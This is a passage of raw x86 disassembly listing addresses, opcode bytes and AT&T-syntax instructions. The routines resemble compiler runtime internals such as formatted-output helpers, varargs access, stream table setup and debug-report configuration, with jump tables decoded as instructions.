  402504:	8b 95 74 fd ff ff    	mov    -0x28c(%ebp),%edx
  40250a:	52                   	push   %edx
  40250b:	8d 85 78 fd ff ff    	lea    -0x288(%ebp),%eax
  402511:	50                   	push   %eax
  402512:	e8 29 02 00 00       	call   0x402740
  402517:	83 c4 10             	add    $0x10,%esp
  40251a:	e9 7a ff ff ff       	jmp    0x402499
  40251f:	eb 1b                	jmp    0x40253c
  402521:	8d 8d d4 fd ff ff    	lea    -0x22c(%ebp),%ecx
  402527:	51                   	push   %ecx
  402528:	8b 55 08             	mov    0x8(%ebp),%edx
  40252b:	52                   	push   %edx
  40252c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40252f:	50                   	push   %eax
  402530:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402533:	51                   	push   %ecx
  402534:	e8 07 02 00 00       	call   0x402740
  402539:	83 c4 10             	add    $0x10,%esp
  40253c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40253f:	83 e2 04             	and    $0x4,%edx
  402542:	85 d2                	test   %edx,%edx
  402544:	74 1c                	je     0x402562
  402546:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  40254c:	50                   	push   %eax
  40254d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402550:	51                   	push   %ecx
  402551:	8b 95 84 fd ff ff    	mov    -0x27c(%ebp),%edx
  402557:	52                   	push   %edx
  402558:	6a 20                	push   $0x20
  40255a:	e8 a1 01 00 00       	call   0x402700
  40255f:	83 c4 10             	add    $0x10,%esp
  402562:	e9 0d f4 ff ff       	jmp    0x401974
  402567:	8b 85 d4 fd ff ff    	mov    -0x22c(%ebp),%eax
  40256d:	5f                   	pop    %edi
  40256e:	5e                   	pop    %esi
  40256f:	5b                   	pop    %ebx
  402570:	8b e5                	mov    %ebp,%esp
  402572:	5d                   	pop    %ebp
  402573:	c3                   	ret    
  402574:	10 1a                	adc    %bl,(%edx)
  402576:	40                   	inc    %eax
  402577:	00 aa 1a 40 00 ec    	add    %ch,-0x13ffbfe6(%edx)
  40257d:	1a 40 00             	sbb    0x0(%eax),%al
  402580:	5b                   	pop    %ebx
  402581:	1b 40 00             	sbb    0x0(%eax),%eax
  402584:	b3 1b                	mov    $0x1b,%bl
  402586:	40                   	inc    %eax
  402587:	00 c2                	add    %al,%dl
  402589:	1b 40 00             	sbb    0x0(%eax),%eax
  40258c:	0e                   	push   %cs
  40258d:	1c 40                	sbb    $0x40,%al
  40258f:	00 a1 1c 40 00 38    	add    %ah,0x3800401c(%ecx)
  402595:	1b 40 00             	sbb    0x0(%eax),%eax
  402598:	43                   	inc    %ebx
  402599:	1b 40 00             	sbb    0x0(%eax),%eax
  40259c:	2e 1b 40 00          	sbb    %cs:0x0(%eax),%eax
  4025a0:	23 1b                	and    (%ebx),%ebx
  4025a2:	40                   	inc    %eax
  4025a3:	00 4e 1b             	add    %cl,0x1b(%esi)
  4025a6:	40                   	inc    %eax
  4025a7:	00 56 1b             	add    %dl,0x1b(%esi)
  4025aa:	40                   	inc    %eax
  4025ab:	00 00                	add    %al,(%eax)
  4025ad:	05 05 01 05 05       	add    $0x5050105,%eax
  4025b2:	05 05 05 05 05       	add    $0x5050505,%eax
  4025b7:	02 05 03 05 05 04    	add    0x4050503,%al
  4025bd:	50                   	push   %eax
  4025be:	1c 40                	sbb    $0x40,%al
  4025c0:	00 89 1c 40 00 45    	add    %cl,0x4500401c(%ecx)
  4025c6:	1c 40                	sbb    $0x40,%al
  4025c8:	00 93 1c 40 00 9c    	add    %dl,-0x63ffbfe4(%ebx)
  4025ce:	1c 40                	sbb    $0x40,%al
  4025d0:	00 00                	add    %al,(%eax)
  4025d2:	04 04                	add    $0x4,%al
  4025d4:	04 04                	add    $0x4,%al
  4025d6:	04 04                	add    $0x4,%al
  4025d8:	04 04                	add    $0x4,%al
  4025da:	04 04                	add    $0x4,%al
  4025dc:	04 04                	add    $0x4,%al
  4025de:	04 04                	add    $0x4,%al
  4025e0:	04 04                	add    $0x4,%al
  4025e2:	04 04                	add    $0x4,%al
  4025e4:	04 04                	add    $0x4,%al
  4025e6:	04 04                	add    $0x4,%al
  4025e8:	04 04                	add    $0x4,%al
  4025ea:	04 04                	add    $0x4,%al
  4025ec:	04 04                	add    $0x4,%al
  4025ee:	04 04                	add    $0x4,%al
  4025f0:	01 04 04             	add    %eax,(%esp,%eax,1)
  4025f3:	04 02                	add    $0x2,%al
  4025f5:	04 04                	add    $0x4,%al
  4025f7:	04 04                	add    $0x4,%al
  4025f9:	04 04                	add    $0x4,%al
  4025fb:	04 04                	add    $0x4,%al
  4025fd:	04 04                	add    $0x4,%al
  4025ff:	03 dc                	add    %esp,%ebx
  402601:	1c 40                	sbb    $0x40,%al
  402603:	00 70 1f             	add    %dh,0x1f(%eax)
  402606:	40                   	inc    %eax
  402607:	00 00                	add    %al,(%eax)
  402609:	1e                   	push   %ds
  40260a:	40                   	inc    %eax
  40260b:	00 a9 20 40 00 6b    	add    %ch,0x6b004020(%ecx)
  402611:	1d 40 00 f1 1c       	sbb    $0x1cf10040,%eax
  402616:	40                   	inc    %eax
  402617:	00 7b 20             	add    %bh,0x20(%ebx)
  40261a:	40                   	inc    %eax
  40261b:	00 80 1f 40 00 25    	add    %al,0x2500401f(%eax)
  402621:	1f                   	pop    %ds
  402622:	40                   	inc    %eax
  402623:	00 f5                	add    %dh,%ch
  402625:	20 40 00             	and    %al,0x0(%eax)
  402628:	9f                   	lahf   
  402629:	20 40 00             	and    %al,0x0(%eax)
  40262c:	16                   	push   %ss
  40262d:	1e                   	push   %ds
  40262e:	40                   	inc    %eax
  40262f:	00 93 20 40 00 b5    	add    %dl,-0x4affbfe0(%ebx)
  402635:	20 40 00             	and    %al,0x0(%eax)
  402638:	87 23                	xchg   %esp,(%ebx)
  40263a:	40                   	inc    %eax
  40263b:	00 00                	add    %al,(%eax)
  40263d:	0e                   	push   %cs
  40263e:	01 0e                	add    %ecx,(%esi)
  402640:	01 0e                	add    %ecx,(%esi)
  402642:	0e                   	push   %cs
  402643:	0e                   	push   %cs
  402644:	0e                   	push   %cs
  402645:	0e                   	push   %cs
  402646:	0e                   	push   %cs
  402647:	0e                   	push   %cs
  402648:	0e                   	push   %cs
  402649:	0e                   	push   %cs
  40264a:	0e                   	push   %cs
  40264b:	0e                   	push   %cs
  40264c:	02 0e                	add    (%esi),%cl
  40264e:	0e                   	push   %cs
  40264f:	0e                   	push   %cs
  402650:	0e                   	push   %cs
  402651:	03 0e                	add    (%esi),%ecx
  402653:	04 0e                	add    $0xe,%al
  402655:	0e                   	push   %cs
  402656:	0e                   	push   %cs
  402657:	0e                   	push   %cs
  402658:	0e                   	push   %cs
  402659:	0e                   	push   %cs
  40265a:	0e                   	push   %cs
  40265b:	0e                   	push   %cs
  40265c:	05 06 07 07 07       	add    $0x7070706,%eax
  402661:	0e                   	push   %cs
  402662:	06                   	push   %es
  402663:	0e                   	push   %cs
  402664:	0e                   	push   %cs
  402665:	0e                   	push   %cs
  402666:	0e                   	push   %cs
  402667:	08 09                	or     %cl,(%ecx)
  402669:	0a 0e                	or     (%esi),%cl
  40266b:	0e                   	push   %cs
  40266c:	0b 0e                	or     (%esi),%ecx
  40266e:	0c 0e                	or     $0xe,%al
  402670:	0e                   	push   %cs
  402671:	0d cc cc cc cc       	or     $0xcccccccc,%eax
  402676:	cc                   	int3   
  402677:	cc                   	int3   
  402678:	cc                   	int3   
  402679:	cc                   	int3   
  40267a:	cc                   	int3   
  40267b:	cc                   	int3   
  40267c:	cc                   	int3   
  40267d:	cc                   	int3   
  40267e:	cc                   	int3   
  40267f:	cc                   	int3   
  402680:	55                   	push   %ebp
  402681:	8b ec                	mov    %esp,%ebp
  402683:	51                   	push   %ecx
  402684:	8b 45 0c             	mov    0xc(%ebp),%eax
  402687:	8b 48 04             	mov    0x4(%eax),%ecx
  40268a:	83 e9 01             	sub    $0x1,%ecx
  40268d:	8b 55 0c             	mov    0xc(%ebp),%edx
  402690:	89 4a 04             	mov    %ecx,0x4(%edx)
  402693:	8b 45 0c             	mov    0xc(%ebp),%eax
  402696:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  40269a:	7c 26                	jl     0x4026c2
  40269c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40269f:	8b 11                	mov    (%ecx),%edx
  4026a1:	8a 45 08             	mov    0x8(%ebp),%al
  4026a4:	88 02                	mov    %al,(%edx)
  4026a6:	0f be 4d 08          	movsbl 0x8(%ebp),%ecx
  4026aa:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  4026b0:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4026b3:	8b 55 0c             	mov    0xc(%ebp),%edx
  4026b6:	8b 02                	mov    (%edx),%eax
  4026b8:	83 c0 01             	add    $0x1,%eax
  4026bb:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4026be:	89 01                	mov    %eax,(%ecx)
  4026c0:	eb 13                	jmp    0x4026d5
  4026c2:	8b 55 0c             	mov    0xc(%ebp),%edx
  4026c5:	52                   	push   %edx
  4026c6:	8b 45 08             	mov    0x8(%ebp),%eax
  4026c9:	50                   	push   %eax
  4026ca:	e8 21 0a 00 00       	call   0x4030f0
  4026cf:	83 c4 08             	add    $0x8,%esp
  4026d2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4026d5:	83 7d fc ff          	cmpl   $0xffffffff,-0x4(%ebp)
  4026d9:	75 0b                	jne    0x4026e6
  4026db:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4026de:	c7 01 ff ff ff ff    	movl   $0xffffffff,(%ecx)
  4026e4:	eb 0d                	jmp    0x4026f3
  4026e6:	8b 55 10             	mov    0x10(%ebp),%edx
  4026e9:	8b 02                	mov    (%edx),%eax
  4026eb:	83 c0 01             	add    $0x1,%eax
  4026ee:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4026f1:	89 01                	mov    %eax,(%ecx)
  4026f3:	8b e5                	mov    %ebp,%esp
  4026f5:	5d                   	pop    %ebp
  4026f6:	c3                   	ret    
  4026f7:	cc                   	int3   
  4026f8:	cc                   	int3   
  4026f9:	cc                   	int3   
  4026fa:	cc                   	int3   
  4026fb:	cc                   	int3   
  4026fc:	cc                   	int3   
  4026fd:	cc                   	int3   
  4026fe:	cc                   	int3   
  4026ff:	cc                   	int3   
  402700:	55                   	push   %ebp
  402701:	8b ec                	mov    %esp,%ebp
  402703:	8b 45 0c             	mov    0xc(%ebp),%eax
  402706:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402709:	83 e9 01             	sub    $0x1,%ecx
  40270c:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  40270f:	85 c0                	test   %eax,%eax
  402711:	7e 20                	jle    0x402733
  402713:	8b 55 14             	mov    0x14(%ebp),%edx
  402716:	52                   	push   %edx
  402717:	8b 45 10             	mov    0x10(%ebp),%eax
  40271a:	50                   	push   %eax
  40271b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40271e:	51                   	push   %ecx
  40271f:	e8 5c ff ff ff       	call   0x402680
  402724:	83 c4 0c             	add    $0xc,%esp
  402727:	8b 55 14             	mov    0x14(%ebp),%edx
  40272a:	83 3a ff             	cmpl   $0xffffffff,(%edx)
  40272d:	75 02                	jne    0x402731
  40272f:	eb 02                	jmp    0x402733
  402731:	eb d0                	jmp    0x402703
  402733:	5d                   	pop    %ebp
  402734:	c3                   	ret    
  402735:	cc                   	int3   
  402736:	cc                   	int3   
  402737:	cc                   	int3   
  402738:	cc                   	int3   
  402739:	cc                   	int3   
  40273a:	cc                   	int3   
  40273b:	cc                   	int3   
  40273c:	cc                   	int3   
  40273d:	cc                   	int3   
  40273e:	cc                   	int3   
  40273f:	cc                   	int3   
  402740:	55                   	push   %ebp
  402741:	8b ec                	mov    %esp,%ebp
  402743:	51                   	push   %ecx
  402744:	8b 45 0c             	mov    0xc(%ebp),%eax
  402747:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40274a:	83 e9 01             	sub    $0x1,%ecx
  40274d:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  402750:	85 c0                	test   %eax,%eax
  402752:	7e 32                	jle    0x402786
  402754:	8b 55 14             	mov    0x14(%ebp),%edx
  402757:	52                   	push   %edx
  402758:	8b 45 10             	mov    0x10(%ebp),%eax
  40275b:	50                   	push   %eax
  40275c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40275f:	0f be 11             	movsbl (%ecx),%edx
  402762:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402765:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402768:	50                   	push   %eax
  402769:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40276c:	83 c1 01             	add    $0x1,%ecx
  40276f:	89 4d 08             	mov    %ecx,0x8(%ebp)
  402772:	e8 09 ff ff ff       	call   0x402680
  402777:	83 c4 0c             	add    $0xc,%esp
  40277a:	8b 55 14             	mov    0x14(%ebp),%edx
  40277d:	83 3a ff             	cmpl   $0xffffffff,(%edx)
  402780:	75 02                	jne    0x402784
  402782:	eb 02                	jmp    0x402786
  402784:	eb be                	jmp    0x402744
  402786:	8b e5                	mov    %ebp,%esp
  402788:	5d                   	pop    %ebp
  402789:	c3                   	ret    
  40278a:	cc                   	int3   
  40278b:	cc                   	int3   
  40278c:	cc                   	int3   
  40278d:	cc                   	int3   
  40278e:	cc                   	int3   
  40278f:	cc                   	int3   
  402790:	55                   	push   %ebp
  402791:	8b ec                	mov    %esp,%ebp
  402793:	8b 45 08             	mov    0x8(%ebp),%eax
  402796:	8b 08                	mov    (%eax),%ecx
  402798:	83 c1 04             	add    $0x4,%ecx
  40279b:	8b 55 08             	mov    0x8(%ebp),%edx
  40279e:	89 0a                	mov    %ecx,(%edx)
  4027a0:	8b 45 08             	mov    0x8(%ebp),%eax
  4027a3:	8b 08                	mov    (%eax),%ecx
  4027a5:	8b 41 fc             	mov    -0x4(%ecx),%eax
  4027a8:	5d                   	pop    %ebp
  4027a9:	c3                   	ret    
  4027aa:	cc                   	int3   
  4027ab:	cc                   	int3   
  4027ac:	cc                   	int3   
  4027ad:	cc                   	int3   
  4027ae:	cc                   	int3   
  4027af:	cc                   	int3   
  4027b0:	55                   	push   %ebp
  4027b1:	8b ec                	mov    %esp,%ebp
  4027b3:	8b 45 08             	mov    0x8(%ebp),%eax
  4027b6:	8b 08                	mov    (%eax),%ecx
  4027b8:	83 c1 08             	add    $0x8,%ecx
  4027bb:	8b 55 08             	mov    0x8(%ebp),%edx
  4027be:	89 0a                	mov    %ecx,(%edx)
  4027c0:	8b 45 08             	mov    0x8(%ebp),%eax
  4027c3:	8b 08                	mov    (%eax),%ecx
  4027c5:	83 e9 08             	sub    $0x8,%ecx
  4027c8:	8b 01                	mov    (%ecx),%eax
  4027ca:	8b 51 04             	mov    0x4(%ecx),%edx
  4027cd:	5d                   	pop    %ebp
  4027ce:	c3                   	ret    
  4027cf:	cc                   	int3   
  4027d0:	55                   	push   %ebp
  4027d1:	8b ec                	mov    %esp,%ebp
  4027d3:	8b 45 08             	mov    0x8(%ebp),%eax
  4027d6:	8b 08                	mov    (%eax),%ecx
  4027d8:	83 c1 04             	add    $0x4,%ecx
  4027db:	8b 55 08             	mov    0x8(%ebp),%edx
  4027de:	89 0a                	mov    %ecx,(%edx)
  4027e0:	8b 45 08             	mov    0x8(%ebp),%eax
  4027e3:	8b 08                	mov    (%eax),%ecx
  4027e5:	66 8b 41 fc          	mov    -0x4(%ecx),%ax
  4027e9:	5d                   	pop    %ebp
  4027ea:	c3                   	ret    
  4027eb:	cc                   	int3   
  4027ec:	cc                   	int3   
  4027ed:	cc                   	int3   
  4027ee:	cc                   	int3   
  4027ef:	cc                   	int3   
  4027f0:	55                   	push   %ebp
  4027f1:	8b ec                	mov    %esp,%ebp
  4027f3:	51                   	push   %ecx
  4027f4:	83 3d 20 4f 42 00 00 	cmpl   $0x0,0x424f20
  4027fb:	75 0c                	jne    0x402809
  4027fd:	c7 05 20 4f 42 00 00 	movl   $0x200,0x424f20
  402804:	02 00 00 
  402807:	eb 13                	jmp    0x40281c
  402809:	83 3d 20 4f 42 00 14 	cmpl   $0x14,0x424f20
  402810:	7d 0a                	jge    0x40281c
  402812:	c7 05 20 4f 42 00 14 	movl   $0x14,0x424f20
  402819:	00 00 00 
  40281c:	68 83 00 00 00       	push   $0x83
  402821:	68 9c 02 42 00       	push   $0x42029c
  402826:	6a 02                	push   $0x2
  402828:	6a 04                	push   $0x4
  40282a:	a1 20 4f 42 00       	mov    0x424f20,%eax
  40282f:	50                   	push   %eax
  402830:	e8 eb 26 00 00       	call   0x404f20
  402835:	83 c4 14             	add    $0x14,%esp
  402838:	a3 cc 3b 42 00       	mov    %eax,0x423bcc
  40283d:	83 3d cc 3b 42 00 00 	cmpl   $0x0,0x423bcc
  402844:	75 3f                	jne    0x402885
  402846:	c7 05 20 4f 42 00 14 	movl   $0x14,0x424f20
  40284d:	00 00 00 
  402850:	68 86 00 00 00       	push   $0x86
  402855:	68 9c 02 42 00       	push   $0x42029c
  40285a:	6a 02                	push   $0x2
  40285c:	6a 04                	push   $0x4
  40285e:	8b 0d 20 4f 42 00    	mov    0x424f20,%ecx
  402864:	51                   	push   %ecx
  402865:	e8 b6 26 00 00       	call   0x404f20
  40286a:	83 c4 14             	add    $0x14,%esp
  40286d:	a3 cc 3b 42 00       	mov    %eax,0x423bcc
  402872:	83 3d cc 3b 42 00 00 	cmpl   $0x0,0x423bcc
  402879:	75 0a                	jne    0x402885
  40287b:	6a 1a                	push   $0x1a
  40287d:	e8 4e ee ff ff       	call   0x4016d0
  402882:	83 c4 04             	add    $0x4,%esp
  402885:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40288c:	eb 09                	jmp    0x402897
  40288e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402891:	83 c2 01             	add    $0x1,%edx
  402894:	89 55 fc             	mov    %edx,-0x4(%ebp)
  402897:	83 7d fc 14          	cmpl   $0x14,-0x4(%ebp)
  40289b:	7d 19                	jge    0x4028b6
  40289d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4028a0:	c1 e0 05             	shl    $0x5,%eax
  4028a3:	05 40 2a 42 00       	add    $0x422a40,%eax
  4028a8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4028ab:	8b 15 cc 3b 42 00    	mov    0x423bcc,%edx
  4028b1:	89 04 8a             	mov    %eax,(%edx,%ecx,4)
  4028b4:	eb d8                	jmp    0x40288e
  4028b6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4028bd:	eb 09                	jmp    0x4028c8
  4028bf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4028c2:	83 c0 01             	add    $0x1,%eax
  4028c5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4028c8:	83 7d fc 03          	cmpl   $0x3,-0x4(%ebp)
  4028cc:	7d 44                	jge    0x402912
  4028ce:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4028d1:	c1 f9 05             	sar    $0x5,%ecx
  4028d4:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4028d7:	83 e2 1f             	and    $0x1f,%edx
  4028da:	8b 04 8d 60 3a 42 00 	mov    0x423a60(,%ecx,4),%eax
  4028e1:	83 3c d0 ff          	cmpl   $0xffffffff,(%eax,%edx,8)
  4028e5:	74 19                	je     0x402900
  4028e7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4028ea:	c1 f9 05             	sar    $0x5,%ecx
  4028ed:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4028f0:	83 e2 1f             	and    $0x1f,%edx
  4028f3:	8b 04 8d 60 3a 42 00 	mov    0x423a60(,%ecx,4),%eax
  4028fa:	83 3c d0 00          	cmpl   $0x0,(%eax,%edx,8)
  4028fe:	75 10                	jne    0x402910
  402900:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402903:	c1 e1 05             	shl    $0x5,%ecx
  402906:	c7 81 50 2a 42 00 ff 	movl   $0xffffffff,0x422a50(%ecx)
  40290d:	ff ff ff 
  402910:	eb ad                	jmp    0x4028bf
  402912:	8b e5                	mov    %ebp,%esp
  402914:	5d                   	pop    %ebp
  402915:	c3                   	ret    
  402916:	cc                   	int3   
  402917:	cc                   	int3   
  402918:	cc                   	int3   
  402919:	cc                   	int3   
  40291a:	cc                   	int3   
  40291b:	cc                   	int3   
  40291c:	cc                   	int3   
  40291d:	cc                   	int3   
  40291e:	cc                   	int3   
  40291f:	cc                   	int3   
  402920:	55                   	push   %ebp
  402921:	8b ec                	mov    %esp,%ebp
  402923:	e8 b8 41 00 00       	call   0x406ae0
  402928:	0f be 05 0c 36 42 00 	movsbl 0x42360c,%eax
  40292f:	85 c0                	test   %eax,%eax
  402931:	74 05                	je     0x402938
  402933:	e8 28 44 00 00       	call   0x406d60
  402938:	5d                   	pop    %ebp
  402939:	c3                   	ret    
  40293a:	cc                   	int3   
  40293b:	cc                   	int3   
  40293c:	cc                   	int3   
  40293d:	cc                   	int3   
  40293e:	cc                   	int3   
  40293f:	cc                   	int3   
  402940:	55                   	push   %ebp
  402941:	8b ec                	mov    %esp,%ebp
  402943:	ff 15 98 51 42 00    	call   *0x425198
  402949:	5d                   	pop    %ebp
  40294a:	c3                   	ret    
  40294b:	cc                   	int3   
  40294c:	cc                   	int3   
  40294d:	cc                   	int3   
  40294e:	cc                   	int3   
  40294f:	cc                   	int3   
  402950:	55                   	push   %ebp
  402951:	8b ec                	mov    %esp,%ebp
  402953:	51                   	push   %ecx
  402954:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  402958:	7c 06                	jl     0x402960
  40295a:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  40295e:	7c 05                	jl     0x402965
  402960:	83 c8 ff             	or     $0xffffffff,%eax
  402963:	eb 3e                	jmp    0x4029a3
  402965:	83 7d 0c ff          	cmpl   $0xffffffff,0xc(%ebp)
  402969:	75 0c                	jne    0x402977
  40296b:	8b 45 08             	mov    0x8(%ebp),%eax
  40296e:	8b 04 85 c4 2c 42 00 	mov    0x422cc4(,%eax,4),%eax
  402975:	eb 2c                	jmp    0x4029a3
  402977:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40297a:	83 e1 f8             	and    $0xfffffff8,%ecx
  40297d:	85 c9                	test   %ecx,%ecx
  40297f:	74 05                	je     0x402986
  402981:	83 c8 ff             	or     $0xffffffff,%eax
  402984:	eb 1d                	jmp    0x4029a3
  402986:	8b 55 08             	mov    0x8(%ebp),%edx
  402989:	8b 04 95 c4 2c 42 00 	mov    0x422cc4(,%edx,4),%eax
  402990:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402993:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402996:	8b 55 0c             	mov    0xc(%ebp),%edx
  402999:	89 14 8d c4 2c 42 00 	mov    %edx,0x422cc4(,%ecx,4)
  4029a0:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4029a3:	8b e5                	mov    %ebp,%esp
  4029a5:	5d                   	pop    %ebp
  4029a6:	c3                   	ret    
  4029a7:	cc                   	int3   
  4029a8:	cc                   	int3   
  4029a9:	cc                   	int3   
  4029aa:	cc                   	int3   
  4029ab:	cc                   	int3   
  4029ac:	cc                   	int3   
  4029ad:	cc                   	int3   
  4029ae:	cc                   	int3   
  4029af:	cc                   	int3   
  4029b0:	55                   	push   %ebp
  4029b1:	8b ec                	mov    %esp,%ebp
  4029b3:	51                   	push   %ecx
  4029b4:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4029b8:	7c 06                	jl     0x4029c0
  4029ba:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4029be:	7c 07                	jl     0x4029c7
  4029c0:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  4029c5:	eb 63                	jmp    0x402a2a
  4029c7:	83 7d 0c fa          	cmpl   $0xfffffffa,0xc(%ebp)
  4029cb:	75 0c                	jne    0x4029d9
  4029cd:	8b 45 08             	mov    0x8(%ebp),%eax
  4029d0:	8b 04 85 d0 2c 42 00 	mov    0x422cd0(,%eax,4),%eax
  4029d7:	eb 51                	jmp    0x402a2a
  4029d9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4029dc:	8b 14 8d d0 2c 42 00 	mov    0x422cd0(,%ecx,4),%edx
  4029e3:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4029e6:	83 7d 0c fc          	cmpl   $0xfffffffc,0xc(%ebp)
  4029ea:	75 14                	jne    0x402a00
  4029ec:	6a f5                	push   $0xfffffff5
  4029ee:	ff 15 9c 51 42 00    	call   *0x42519c
  4029f4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4029f7:	89 04 8d d0 2c 42 00 	mov    %eax,0x422cd0(,%ecx,4)
  4029fe:	eb 27                	jmp    0x402a27
  402a00:	83 7d 0c fb          	cmpl   $0xfffffffb,0xc(%ebp)
  402a04:	75 14                	jne    0x402a1a
  402a06:	6a f4                	push   $0xfffffff4
  402a08:	ff 15 9c 51 42 00    	call   *0x42519c
  402a0e:	8b 55 08             	mov    0x8(%ebp),%edx
  402a11:	89 04 95 d0 2c 42 00 	mov    %eax,0x422cd0(,%edx,4)
  402a18:	eb 0d                	jmp    0x402a27
  402a1a:	8b 45 08             	mov    0x8(%ebp),%eax
  402a1d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  402a20:	89 0c 85 d0 2c 42 00 	mov    %ecx,0x422cd0(,%eax,4)
  402a27:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402a2a:	8b e5                	mov    %ebp,%esp
  402a2c:	5d                   	pop    %ebp
  402a2d:	c3                   	ret    
  402a2e:	cc                   	int3   
  402a2f:	cc                   	int3   
  402a30:	55                   	push   %ebp
  402a31:	8b ec                	mov    %esp,%ebp
  402a33:	51                   	push   %ecx
  402a34:	a1 c0 3b 42 00       	mov    0x423bc0,%eax
  402a39:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402a3c:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402a3f:	89 0d c0 3b 42 00    	mov    %ecx,0x423bc0
  402a45:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402a48:	8b e5                	mov    %ebp,%esp
  402a4a:	5d                   	pop    %ebp
  402a4b:	c3                   	ret    
  402a4c:	cc                   	int3   
  402a4d:	cc                   	int3   
  402a4e:	cc                   	int3   
  402a4f:	cc                   	int3   
  402a50:	55                   	push   %ebp
  402a51:	8b ec                	mov    %esp,%ebp
  402a53:	b8 2c 30 00 00       	mov    $0x302c,%eax
  402a58:	e8 93 49 00 00       	call   0x4073f0
  402a5d:	57                   	push   %edi
  402a5e:	c6 85 f8 cf ff ff 00 	movb   $0x0,-0x3008(%ebp)
  402a65:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  402a6a:	33 c0                	xor    %eax,%eax
  402a6c:	8d bd f9 cf ff ff    	lea    -0x3007(%ebp),%edi
  402a72:	f3 ab                	rep stos %eax,%es:(%edi)
  402a74:	66 ab                	stos   %ax,%es:(%edi)
  402a76:	aa                   	stos   %al,%es:(%edi)
  402a77:	c6 85 f8 df ff ff 00 	movb   $0x0,-0x2008(%ebp)
  402a7e:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  402a83:	33 c0                	xor    %eax,%eax
  402a85:	8d bd f9 df ff ff    	lea    -0x2007(%ebp),%edi
  402a8b:	f3 ab                	rep stos %eax,%es:(%edi)
  402a8d:	66 ab                	stos   %ax,%es:(%edi)
  402a8f:	aa                   	stos   %al,%es:(%edi)
  402a90:	c6 85 00 f0 ff ff 00 	movb   $0x0,-0x1000(%ebp)
  402a97:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  402a9c:	33 c0                	xor    %eax,%eax
  402a9e:	8d bd 01 f0 ff ff    	lea    -0xfff(%ebp),%edi
  402aa4:	f3 ab                	rep stos %eax,%es:(%edi)
  402aa6:	66 ab                	stos   %ax,%es:(%edi)
  402aa8:	aa                   	stos   %al,%es:(%edi)
  402aa9:	8d 45 1c             	lea    0x1c(%ebp),%eax
  402aac:	89 85 fc ef ff ff    	mov    %eax,-0x1004(%ebp)
  402ab2:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  402ab6:	7c 06                	jl     0x402abe
  402ab8:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  402abc:	7c 08                	jl     0x402ac6
  402abe:	83 c8 ff             	or     $0xffffffff,%eax
  402ac1:	e9 15 03 00 00       	jmp    0x402ddb
  402ac6:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  402aca:	0f 85 a0 00 00 00    	jne    0x402b70
  402ad0:	68 c0 2c 42 00       	push   $0x422cc0
  402ad5:	ff 15 b4 51 42 00    	call   *0x4251b4
  402adb:	85 c0                	test   %eax,%eax
  402add:	0f 8e 8d 00 00 00    	jle    0x402b70
  402ae3:	83 3d c8 35 42 00 00 	cmpl   $0x0,0x4235c8
  402aea:	75 42                	jne    0x402b2e
  402aec:	68 70 03 42 00       	push   $0x420370
  402af1:	ff 15 b0 51 42 00    	call   *0x4251b0
  402af7:	89 85 f4 cf ff ff    	mov    %eax,-0x300c(%ebp)
  402afd:	83 bd f4 cf ff ff 00 	cmpl   $0x0,-0x300c(%ebp)
  402b04:	74 20                	je     0x402b26
  402b06:	68 64 03 42 00       	push   $0x420364
  402b0b:	8b 8d f4 cf ff ff    	mov    -0x300c(%ebp),%ecx
  402b11:	51                   	push   %ecx
  402b12:	ff 15 ac 51 42 00    	call   *0x4251ac
  402b18:	a3 c8 35 42 00       	mov    %eax,0x4235c8
  402b1d:	83 3d c8 35 42 00 00 	cmpl   $0x0,0x4235c8
  402b24:	75 08                	jne    0x402b2e
